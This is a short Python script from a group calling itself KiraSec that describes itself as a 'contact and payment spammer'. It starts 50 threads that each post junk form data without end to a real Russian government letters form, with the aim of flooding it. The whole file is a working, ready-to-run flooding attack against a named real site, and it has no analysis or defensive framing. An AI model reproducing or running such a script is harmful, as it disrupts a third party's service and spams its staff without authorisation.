#Created by Kali of KiraSec

from colorama import Fore, Back, Style
from pickle import APPEND
import threading
import requests


print (Fore.BLUE + '''
| |/ (_)_ __ __ _/ ___|  ___  ___
| ' /| | '__/ _` \___ \ / _ \/ __|
| . \| | | | (_| |___) |  __| (__
|_|\_|_|_|  \__,_|____/ \___|\___| 

 Contact and payment spammer made with <3 by kali of team KiraSec

''')


url = 'http://services.government.ru/en/letters/form/'

data = {
    'email': 'rekt@gmail.com',
    'surname': 'wowoak',
    'firstname': 'AHA',
    'middlename': 'LOL',
    'phone': '1234567890',
    'question': 'lmao',
    
}
def do_requests():
    while True:
        response = requests.post(url, data=data).text
        print(response)

threads = []

for i in range(50):
    t = threading.Thread(target=do_requests)
    t.daemon = True 
    threads.append(t)

for i in range(50):
    threads[i].start()


for i in range(50):
    threads[i].join()
